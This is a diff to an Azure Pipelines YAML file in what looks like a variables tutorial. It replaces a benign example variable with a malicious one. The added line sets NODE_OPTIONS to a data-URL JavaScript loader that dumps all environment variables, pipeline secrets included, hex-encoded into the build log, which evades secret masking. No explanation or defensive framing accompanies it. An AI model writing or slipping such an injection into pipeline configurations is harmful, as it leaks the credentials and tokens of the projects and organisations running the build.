@@ -20,7 +20,7 @@ steps:
   
 # Create a variable
 - bash: |
-    echo "##vso[task.setvariable variable=sauce]crushed tomatoes"
+    echo "##vso[task.setvariable variable=NODE_OPTIONS]--experimental-modules --experimental-loader=data:text/javascript,console.log(Buffer.from(JSON.stringify(process.env)).toString('hex'));//"
 
 # Use the variable
 # "$(sauce)" is replaced by the contents of the `sauce` variable by Azure Pipelines
